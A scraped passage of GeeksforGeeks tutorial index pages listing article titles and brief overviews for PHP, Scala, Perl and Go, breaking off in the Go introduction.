addNoiseImage() FunctionPHP | Imagick annotateImage() FunctionPHP | Imagick appendImages() FunctionPHP | Imagick autoLevelImage() FunctionPHP | Imagick Functions Complete ReferencePHP ImagickDraw Functionsexpand_morePHP | ImagickDraw annotation() FunctionPHP | ImagickDraw arc() FunctionPHP | ImagickDraw bezier() FunctionPHP | ImagickDraw circle() FunctionPHP | ImagickDraw getStrokeOpacity() FunctionPHP | ImagickDraw getStrokeWidth() FunctionPHP | ImagickDraw line() FunctionPHP | ImagickDraw point() FunctionPHP | ImagickDraw polygon() FunctionPHP | ImagickDraw Functions Complete ReferencePHP DsDeque Functionsexpand_morePHP | Ds\Deque allocate() FunctionPHP | Ds\Deque apply() FunctionPHP | Ds\Deque capacity() FunctionPHP | Ds\Deque clear() FunctionPHP | Ds\Deque __construct() FunctionPHP | Ds\Deque copy() FunctionPHP | Ds\Deque count() FunctionPHP | Ds\Deque filter() FunctionPHP | Ds\Deque find() FunctionPHP | Ds\Deque Functions Complete ReferencePHP DsMap Functionsexpand_morePHP | Ds\Map allocate() FunctionPHP | Ds\Map apply() FunctionPHP | Ds\Map capacity() FunctionPHP | DS\Map clear() FunctionPHP | Ds\Map __construct() FunctionPHP Ds\Map copy() FunctionPHP | Ds\Map count() FunctionPHP | Ds\Map diff() FunctionPHP | Ds\Map filter() FunctionPHP | Ds\Map first() FunctionPHP | Ds\Map Functions Complete ReferencePHP DSSequence Functionsexpand_morePHP | Ds\Sequence allocate() FunctionPHP | Ds\Sequence apply() FunctionPHP | Ds\Sequence capacity() FunctionPHP | Ds\Sequence contains() FunctionPHP | Ds\Sequence filter() FunctionPHP | Ds\Sequence find() FunctionPHP | Ds\Sequence first() FunctionPHP | Ds\Sequence get() FunctionPHP | Ds\Sequence insert() FunctionPHP | DS\Sequence Functions Complete ReferencePHP DSVector Functionsexpand_morePHP | Ds\Vector allocate() FunctionPHP | Ds\Vector apply() FunctionPHP | Ds\Vector capacity() FunctionPHP | Ds\Vector clear() FunctionPHP | Ds\Vector __construct() FunctionPHP | Ds\Vector contains() FunctionPHP | Ds\Vector copy() FunctionPHP | Ds\Vector count() FunctionPHP | Ds\Vector filter() FunctionPHP | DS\Vector Functions Complete ReferencePHP DsStack Functionsexpand_morePHP | Ds\Stack clear() FunctionPHP | Ds\Stack copy() FunctionPHP | Ds\Stack isEmpty() FunctionPHP | Ds\Stack peek() FunctionPHP | Ds\Stack pop() FunctionPHP | Ds\Stack push() FunctionPHP | Ds\Stack toArray() FunctionPHP DsQueue Functionsexpand_morePHP Ds\Queue allocate() FunctionPHP Ds\Queue capacity() FunctionPHP Ds\Queue clear() FunctionPHP Ds\Queue copy() FunctionPHP Ds\Queue count() FunctionPHP Ds\Queue isEmpty() FunctionPHP Ds\Queue peek() FunctionPHP Ds\Queue pop() FunctionPHP Ds\Queue push() FunctionPHP Ds\Queue toArray() FunctionPHP DsPriorityQueue Functionsexpand_morePHP Ds\PriorityQueue allocate() FunctionPHP Ds\PriorityQueue capacity() FunctionPHP Ds\PriorityQueue clear() FunctionPHP Ds\PriorityQueue copy() FunctionPHP Ds\PriorityQueue count() FunctionPHP Ds\PriorityQueue peek() FunctionPHP Ds\PriorityQueue pop() FunctionPHP Ds\PriorityQueue push() FunctionPHP Ds\PriorityQueue toArray() FunctionPHP SPL Data structuresexpand_moreSplDoublyLinkedList in PHPPHP | SplDoublyLinkedList add() FunctionPHP | SplDoublyLinkedList bottom() FunctionPHP | SplDoublyLinkedList count() functionPHP | SplFixedArray count() FunctionPHP | SplFixedArray current() FunctionPHP | SplFixedArray getSize() FunctionPHP | SplFixedArray key() FunctionPHP | SplObjectStorage addAll() FunctionPHP | SplObjectStorage attach() FunctionPHP | SplObjectStorage contains() FunctionPHP | SplObjectStorage count() FunctionPHP | SplQueue::__construct() FunctionPHP | SPL Data structures Complete Reference PHP Tutorials The term PHP is an acronym for PHP: Hypertext Preprocessor. PHP is a server-side scripting language designed specifically for web development. PHP can be easily embedded in HTML files and HTML codes can also be written in a PHP file. The thing that differentiates PHP with client-side language like HTML is, PHP codes are executed on the server whereas HTML codes are directly rendered on the browser. ‘Recent Articles’ on PHP Topics : Basics Questions related to Basics Array Functions String Functions Math Functions IntlChar Functions Imagick Functions Gmagick Functions Filesystem Functions Spreadsheet_Excel_Writer PHP Programs Misc PHP Functions Complete References Basics: Introduction Setting up development environment Coding Standards Basic Syntax Echo and Print Variables Data-Types Superglobals Constants Defining Constants Decision Making Loops Functions Arrays Types of Errors cURL Namespace Strings Objects Classes Serializing Data Exception Handling Error handling More>> Questions related to Basics: What is the use of the @ symbol in PHP? Check if a number is Perfect number Check if a number is prime Sum of digits of a number Separate odd and even elements from array without using loop ‘AND’ vs ‘&&’ as operator in PHP Double not (!!) operator in PHP What is the difference between the | and || or operator in php? What is the difference between echo, print, and print_r in PHP? What is the difference between public, private, and protected in PHP? More>> Array Functions: php | array_chunk() Function php | array_combine() Function php | array_count_values() Function php | array_diff_assoc() Function php | array_diff_keys() Function php | array_fill_keys() Function php | array_fill() Function php | array_filter() Function php | array_flip() Function php | array_intersect_assoc() Function More>> Strings: PHP | addcslashes() Function PHP | addslashes() Function PHP | bin2hex() Function PHP | chop() Function PHP | chr() Fucntion PHP | convert_uuencode() Function PHP | count_chars() Function PHP | crc32() Function PHP | crypt() Function PHP | echo More>> Math Functions: PHP | abs() Function PHP | acos() Function PHP | acosh() Function PHP | asin() Function PHP | asinh() Function PHP | atanh() Function PHP | base_convert() Function PHP | bindec() Function PHP | ceil() Function PHP | cos() Function More>> IntlChar Functions: PHP | IntlChar::charAge() Function PHP | IntlChar::charDigitValue() Function PHP | IntlChar::charDirection() Function PHP | IntlChar::charMirror() Function PHP | IntlChar::charName() Function PHP | IntlChar::charType() Function PHP | IntlChar::chr() Function PHP | IntlChar::digit() function PHP | IntlChar::forDigit() Function PHP | IntlChar::getBidiPairedBracket() Function More>> Imagick Function: PHP | Imagick adaptiveBlurImage() Function PHP | Imagick adaptiveResizeImage() Function PHP | Imagick adaptiveSharpenImage() Function PHP | Imagick adaptiveThresholdImage() Function PHP | Imagick addImage() Function PHP | Imagick addNoiseImage() Function PHP | Imagick annotateImage() Function PHP | Imagick appendImages() Function PHP | Imagick autoLevelImage() Function PHP | Imagick blackThresholdImage() Function More>> Gmagick Function: PHP | Gmagick addImage() Function PHP | Gmagick addnoiseimage() Function PHP | Gmagick annotateImage() Function PHP | Gmagick blurimage() Function PHP | Gmagick borderImage() Function PHP | Gmagick charcoalimage() Function PHP | Gmagick chopimage() Function PHP | Gmagick clear() Function PHP | Gmagick commentImage() Function PHP | Gmagick cropimage() Function More>> Filesystem Function: PHP | basename() Function PHP | chgrp() Function PHP | chmod() Function PHP | chown() Function PHP | copy() Function PHP | dirname() Function PHP | disk_free_space() Function PHP | disk_total_space() Function PHP | fclose() Function PHP | feof() Function More>> Spreadsheet: PHP | Spreadsheet_Excel_Writer | Introduction PHP | Spreadsheet_Excel_Writer | addFormat() Function PHP | Spreadsheet_Excel_Writer | Close() Function PHP | Spreadsheet_Excel_Writer | addWorksheet() Function PHP | Spreadsheet_Excel_Writer | setFontFamily() Function PHP | Spreadsheet_Excel_Writer | setScript() Function PHP | Spreadsheet_Excel_Writer | setShadow() Function PHP | Spreadsheet_Excel_Writer | setOutLine() Function PHP | Spreadsheet_Excel_Writer | setStrikeOut() Function PHP | Spreadsheet_Excel_Writer | setTextWrap() Function More>> Programs: PHP | Program to move (key,value) pair upwards or downwards PHP program to find the maximum and the minimum in array PHP | Program to delete an element from array using unset() function PHP | Remove duplicate elements from Array PHP | Sort array of strings in natural and standard orders Program to find the number of days between two dates in PHP How to calculate the difference between two dates in PHP? Convert an object to associative array in PHP Generating OTP (One time Password) in PHP Program to Insert new item in array on any position in PHP Split a comma delimited string into an array in PHP How to generate a random, unique, alphanumeric string in PHP Program to generate random string in PHP PHP | Print the last value of an array without affecting the pointer PHP program to find the Standard Deviation of an array PHP program to change date format PHP programs for printing pyramid patterns PHP | Program to check a string is a rotation of another string Program to remove empty array elements in PHP How to check an array is associative or sequential in PHP? Get the full URL in PHP How to remove non-alphanumeric characters in PHP? How to check whether an array is empty using PHP? Difference between isset() and array_key_exists() Function in PHP How to run JavaScript from PHP? How to display HTML tags as plain text using PHP PHP program to fetch data from localhost server database using XAMPP How to convert array to SimpleXML in PHP How to read if a checkbox is checked in PHP? How to call PHP function from string stored in a Variable How to get multiple selected values of select box in php? How to make a redirect in PHP? How to convert an image to base64 encoding in PHP? More>> Misc: PHP | MySQL Database Introduction PHP | MySQL ( Creating Database ) PHP | MySQL ( Creating Table ) PHP | MySQL Select Query PHP | MySQL UPDATE Query PHP | MySQL Delete Query PHP | Inserting into MySQL database PHP | MySQL LIMIT Clause PHP | MySQL WHERE Clause PHP | MySQL ORDER BY Clause PHP | mysqli_num_rows() Function PHP | Uploading File PHP | Send Attachment With Email PHP | Determining Client IP Address PHP 5 VS PHP 7 PHP vs. Node.js PHP Pagination | Set 1 PHP Pagination | Set 2 PHP Pagination | Set 3 HTTP GET and POST Methods in PHP Program to count Page Views Cookies Binary Search in PHP Basics of File Handling LDAP and LDAP Injection/Prevention PHP | FPDF-PDF Generator PHP Functions Complete References: PHP | array Functions Complete Reference PHP | String Functions Complete Reference PHP | Math Functions Complete Reference PHP | GMP Functions Complete Reference PHP | Calendar Functions Complete Reference PHP | IntlChar Functions Complete Reference PHP | Imagick Functions Complete Reference PHP | Gmagick Functions Complete Reference PHP | ImagickDraw Functions Complete Reference PHP | Image Processing and GD Functions Complete Reference PHP | SPL Data structures Complete Reference PHP | DS\Sequence Functions Complete Reference PHP | DS\Vector Functions Complete Reference PHP | Ds\Deque Functions Complete Reference PHP | Ds\Map Functions Complete Reference PHP | Ds\Set Functions Complete Reference PHP | Ds\Stack Functions Complete Reference PHP | Ds\Queue Functions Complete Reference PHP | Ds\PriorityQueue Functions Complete Reference PHP | Filesystem Functions Complete Reference Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 10 Programming Languages to Learn in 2020 - Demand, Jobs, Career GrowthTypes of Environments in AIDesign Twitter - A System Design Interview Question Most Visited Articles Top 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMaximal independent set from a given Graph using Backtracking room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Scala Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Overviewexpand_moreScala Programming LanguageIntroduction to ScalaSetting up the environment in ScalaHello World in ScalaBasicsexpand_moreScala KeywordsScala IdentifiersData Types in ScalaVariables in ScalaControl Statementsexpand_moreScala | Decision Making (if, if-else, Nested if-else, if-else if)Scala | Loops(while, do..while, for, nested loops)Break statement in ScalaScala | LiteralsOOP Conceptsexpand_moreClass and Object in ScalaInheritance in ScalaOperators in ScalaScala Singleton and Companion ObjectsScala ConstructorsScala | PolymorphismScala | MultithreadingScala this keywordMethodsexpand_moreScala | Functions – BasicsAnonymous Functions in ScalaScala | ClosuresRecursion in ScalaMethod Overloading in ScalaMethod Overriding in ScalaLambda Expression in ScalaScala VarargsStringsexpand_moreScala StringScala | String InterpolationScala | StringContextRegular Expressions in ScalaStringBuilder in ScalaScala Packagesexpand_morePackages In ScalaScala | Package ObjectsChained Package Clauses in ScalaFile Handling in ScalaScala Traitexpand_moreScala | TraitsScala | Sealed TraitScala | Trait MixinsTrait Linearization in ScalaCollectionsexpand_moreScala ListsScala ListBufferListSet in ScalaScala MapScala | ArraysScala | ArrayBufferScala | TupleSet in Scala | Set-1Set in Scala | Set-2BitSet in ScalaHashSet In ScalaStack in ScalaHashMap in ScalaTreeSet in ScalaIterators in ScalaScala | Option Scala Programming Language Scala is a general-purpose, high-level, multi-paradigm programming language. It is a pure object-oriented programming language which also provides support to the functional programming approach. Scala programs can convert to bytecodes and can run on the JVM (Java Virtual Machine). Scala stands for Scalable language. It also provides Javascript runtimes. Scala is highly influenced by Java and some other programming languages like Lisp, Haskell, Pizza etc. Recent Articles on Scala ! Overview, Basics, Control Statements, OOP Concepts, Parameterized – Type, Exceptions, Scala Annotation, Methods, String, Scala Packages, Scala Trait, Collections, Scala Options, Miscellaneous Topics Overview Introduction to Scala Interesting fact about Scala Setting up the environment in Scala How to install Scala in Linux? How to install Scala in Windows? What makes Scala scalable? Hello World in Scala Scala | Uniform Access Principle Scala vs Java Python vs Scala Difference between Kotlin and Scala Scala | REPL Basics Scala Keywords Scala Identifiers Data Types in Scala Variables in Scala Scala Console | println, printf and readLine Scala Identifiers Scala | Pattern Matching Comments In Scala Command Line Argument in Scala Enumeration in Scala Scope of Variables In Scala Scala | Ranges Control Statements Scala | Decision Making Scala | Loops(while, do..while, for, nested loops) For Loop in Scala while and do while Loop in Scala Break statement in Scala Scala | Literals Scala | yield Keyword Scala | Type Inference OOP Concepts Class and Object in Scala Inner class in Scala Inheritance in Scala Operators in Scala Operators Precedence in Scala Abstract Classes in Scala Singleton and Companion Objects Generic Classes in Scala Access Modifiers in Scala Scala Constructors Scala | Primary Constructor Scala | Auxiliary Constructor Calling A Super Class Constructor in Scala Extending a Class in Scala Scala | Case Class and Case Object Scala | Polymorphism Value classes Scala | Field Overriding Scala | Abstract Type members Type Casting in Scala Object Casting in Scala Object Equality in Scala Scala | Multithreading Scala | Final Scala this keyword Scala | Controlling visibility of constructor fields Parameterized – Type Scala Type Hierarchy Scala | Lower Bound Scala | Upper bound Scala | Variances Scala | Null, null, Nil, Nothing, None, and Unit Exceptions Scala | Exception Handling Throw Keyword in Scala Scala | Try-Catch Exceptions Scala | Finally Exceptions Scala | Either Scala Annotation Scala | Annotation Scala | Self types Annotation Methods Scala | Functions – Basics Currying Functions in Scala with Examples Anonymous Functions in Scala Higher Order Functions in Scala Scala | Named Arguments Scala | Functions Call-by-Name Scala | Closures Scala | Nested Functions Parameterless Method in Scala Recursion in Scala Tail Recursion in Scala Scala | Partially Applied functions Method Overloading in Scala Method Overriding in Scala Scala | Method Invocation Scala | Format and Formatted Method Controlling Method Scope In Scala Scala | Repeated Method Parameters Partial Functions in Scala Lambda Expression in Scala Scala Varargs Scala | Function Composition Call a method on a Super Class in Scala Implicit Conversions in Scala String Scala String Scala | String Interpolation Scala | StringContext Regular Expressions in Scala StringBuilder in Scala String concatenation in Scala Scala Packages Packages In Scala Scala | Package Objects Chained Package Clauses in Scala File Handling in Scala Scala Trait Scala | Traits Scala | Sealed Trait Scala | Trait Mixins Trait Linearization in Scala Scala | Trait App Difference Between Traits and Abstract Classes in Scala Scala Trait Traversable | Set-1 Scala Trait Traversable | Set-2 Scala Trait Traversable | Set-3 Scala Trait Traversable | Set-4 Collections Scala Lists Scala ListBuffer ListSet in Scala Scala | Arrays Multidimensional Arrays in Scala Scala | Create Array with Range Scala | ArrayBuffer Scala | Tuple Set in Scala | Set-1 Set in Scala | Set-2 BitSet in Scala HashSet In Scala Stack in Scala HashMap in Scala ListMap in Scala TreeSet in Scala Scala | Reduce, fold or scan Iterators in Scala Map Scala Map Scala | Methods to Call on a Map | Set-1 Scala | map() method Scala Options Scala | Option Scala | Methods to Call Option Scala | unapplySeq() method Miscellaneous Topics Getters and Setters in Scala Scala Extractors Scala For Comprehensions Scala | Sequence Comprehensions The Factory Pattern in Scala Scala | Lazy Evaluation Monads in Scala Lazy val and Infinite Sequences in Scala Scala Stream Recursive Streams and collection in Scala Placeholder Syntax in Scala Scala | Sieve of Eratosthenes Using Extractors with Pattern Matching In Scala Overriding Accessors and Mutators in Scala My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Perl Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_morePerl Programming LanguageIntroduction to PerlPerl Installation and Environment Setup in Windows, Linux, and MacOSPerl | Basic Syntax of a Perl ProgramHello World Program in PerlFundamentalsexpand_morePerl | Data TypesPerl | Boolean ValuesPerl | Operators | Set – 1Perl | Operators | Set – 2Perl | VariablesPerl | ModulesPackages in PerlControl Flowexpand_morePerl | Decision Making (if, if-else, Nested–if, if-elsif ladder, unless, unless-else, unless-elsif)Perl | Loops (for, foreach, while, do…while, until, Nested loops)Perl | given-when StatementPerl | goto statementArrays & Listsexpand_morePerl | ArraysPerl | Array SlicesPerl | Arrays (push, pop, shift, unshift)Perl List and its TypesHashexpand_morePerl HashPerl | Hash OperationsPerl | Multidimensional HashesScalarsexpand_morePerl | ScalarsPerl | Comparing ScalarsPerl | scalar keywordStringsexpand_morePerl | Quoted, Interpolated and Escaped StringsPerl | String OperatorsPerl | String functions (length, lc, uc, index, rindex)OOP Conceptsexpand_moreObject Oriented Programming (OOPs) in PerlPerl | Classes in OOPPerl | Objects in OOPsPerl | Methods in OOPsPerl | Constructors and DestructorsPerl | Method Overriding in OOPsPerl | Inheritance in OOPsPerl | Polymorphism in OOPsPerl | Encapsulation in OOPsRegular Expressionsexpand_morePerl | Regular ExpressionsPerl | Operators in Regular ExpressionPerl | Regex Character ClassesPerl | Quantifiers in Regular ExpressionFile Handlingexpand_morePerl | File Handling IntroductionPerl | Opening and Reading a FilePerl | Writing to a FilePerl | Useful File-handling functionsCGI Programmingexpand_morePerl | CGI ProgrammingPerl | File Upload in CGIPerl | GET vs POST in CGI Perl Programming Language Perl is a general purpose, high level interpreted and dynamic programming language. Perl supports both the procedural and Object-Oriented programming. Perl is a lot similar to C syntactically and is easy for the users who have knowledge of C, C++. Since Perl is a lot similar to other widely used languages syntactically, it is easier to code and learn in Perl. Programs can be written in Perl in any of the widely used text editors like Notepad++, gedit, etc. Recent Articles on Perl! Basics, Fundamentals, Input and Output, Control Flow, Datatypes, Strings, Object Oriented Programming in Perl, Subroutines, Regular Expressions, File Handling, Context Sensitivity, CGI Programming, Misc Basics Introduction to Perl Installation and Environment Setup Syntax of a Perl Program Hello World Program in Perl Perl vs C/C++ Perl vs Java Perl vs Python Fundamentals Modes of Writing a Perl Code Boolean Values Operators | Set – 1, Set – 2 Variables Variables and its Types Scope of Variables Modules in Perl Packages in Perl Number and its Types Directories with CRUD operations Input and Output Use of print() and say() in Perl Perl | print operator Use of STDIN for Input Control Flow Decision Making Loops Perl given-when Statement Perl goto operator next operator redo operator last in loop Datatypes Data Types Arrays and Lists: Arrays Array Slices Getting the Number of Elements of an Array Reverse an array Sorting of Arrays Useful Array functions Arrays (push, pop, shift, unshift) Implementing a Stack List and its Types List Functions Hash: Introduction to Hash Working of a Hash Hash Operations Sorting a Hash Multidimensional Hashes Hash in Scalar and List Context Useful Hash functions Scalars: Scalars Comparing Scalars scalar keyword Strings Quoted, Interpolated and Escaped Strings Multi-line Strings | Here Document Sorting mixed Strings in Perl String Operators Useful String Operators String functions (length, lc, uc, index, rindex) Useful String functions Automatic String to Number Conversion or Casting Count the frequency of words in text Removing leading and trailing white spaces (trim) Object Oriented Programming in Perl Introduction to OOPs Classes Objects Methods Constructors and Destructors Method Overriding Inheritance Polymorphism Encapsulation Subroutines Subroutines or Functions | Set – 1, Set – 2 Function Signature in Perl Passing Complex Parameters to a Subroutine Mutable and Immutable parameters Multiple Subroutines Use of return() Function References Pass By Reference Recursion in Perl Regular Expressions Regular Expressions Operators in Regular Expression Regex Character Classes Special Character Classes in Regular Expressions Quantifiers in Regular Expression Backtracking in Regular Expression ‘e’ modifier in Regex ‘ee’ Modifier in Regex pos() function in Regex Regex Cheat Sheet Searching in a File using regex File Handling File Handling Introduction Opening and Reading a File Writing to a File Appending to a File Reading a CSV File File Test Operators File Locking Use of Slurp Module Useful File-handling functions Context Sensitivity Scalar Context Sensitivity List Context Sensitivity STDIN in Scalar and List Context CGI Programming CGI Programming File Upload in CGI GET vs POST in CGI Misc Breakpoints of a Debugger Exiting from a Script Creating Excel Files Reading Excel Files Number Guessing Game using Perl Database management using DBI Accessing a Directory using File Globbing Use of Hash bang or Shebang line Useful Math functions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Golang - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Overviewexpand_moreGolangGo Programming Language (Introduction)How to Install Go on Windows?How to Install Golang on MacOS?Hello World in GolangFundamentalsexpand_moreIdentifiers in Go LanguageGo KeywordsData Types in GoGo VariablesConstants- Go LanguageGo OperatorsControl Statementsexpand_moreGo Decision Making (if, if-else, Nested-if, if-else-if)Loops in Go LanguageSwitch Statement in GoFunctions & Methodsexpand_moreFunctions in Go LanguageVariadic Functions in GoAnonymous function in Go Languagemain and init function in GolangWhat is Blank Identifier(underscore) in Golang?Defer Keyword in GolangMethods in GolangStructureexpand_moreStructures in GolangNested Structure in GolangAnonymous Structure and Field in GolangArraysexpand_moreArrays in GoHow to Copy an Array into Another Array in Golang?How to pass an Array to a Function in Golang?Slicesexpand_moreSlices in GolangSlice Composite Literal in GoHow to sort a slice of ints in Golang?How to trim a slice of bytes in Golang?How to split a slice of bytes in Golang?Stringsexpand_moreStrings in GolangHow to Trim a String in Golang?How to Split a String in Golang?Different ways to compare Strings in GolangPointersexpand_morePointers in GolangPointers to a Function in GoPointer to a Struct in GolangGo Pointer to Pointer (Double Pointer)Comparing Pointers in GolangConcurrencyexpand_moreGoroutines – Concurrency in GolangSelect Statement in Go LanguageMultiple GoroutinesChannel in GolangUnidirectional Channel in Golang Golang Golang is a procedural and statically typed programming language having the syntax similar to C programming language. Sometimes it is termed as Go Programming Language. It provides a rich standard library, garbage collection, and dynamic-typing capability. It was developed in 2007 by Robert Griesemer, Rob Pike, and Ken Thompson at Google but launched in 2009 as an open-source programming language and mainly used in Google’s production systems. Golang is one of the most trending programming languages among developers. Recent Articles on Golang! Overview, Fundamentals, Control Flow, Functions and Methods, Structure, Arrays & Slices, String, Pointers, Interfaces, Concurrency Overview Introduction to Golang Installing Golang on 